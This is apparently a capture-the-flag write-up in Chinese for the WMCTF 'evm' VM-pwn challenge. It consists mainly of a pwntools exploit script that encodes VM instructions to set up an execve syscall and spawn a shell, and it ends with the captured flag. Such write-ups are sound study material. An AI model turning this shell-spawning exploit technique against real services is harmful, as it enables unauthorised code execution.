---
date: 2024-09-11 16:08
challenge: evm
tags:
  - vm pwn
---

挺无聊的一道题，逆完可以看到设置参数并 syscall：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def send_code(data):
    sl(i2b(len(data)))
    sl(i2b(0))
    s(data)


def add(dest, src, num):
    return p32(0x13 | (dest << 7) | (0 << 12) | (src << 15) | (num << 20))


def mov(reg, num):
    page = num & ~0xFFF
    off = num & 0xFFF
    return p32(0x37 | (reg << 7) | page) + add(reg, reg, off)


code = mov(10, 0x3B) + mov(11, 0x4050A0) + mov(12, 0) + mov(13, 0)
send_code(code)
send_code(p8(0x73))


ia()

# WMCTF{53a47f98-41ff-4366-b58a-e2ef007f14e1}
```
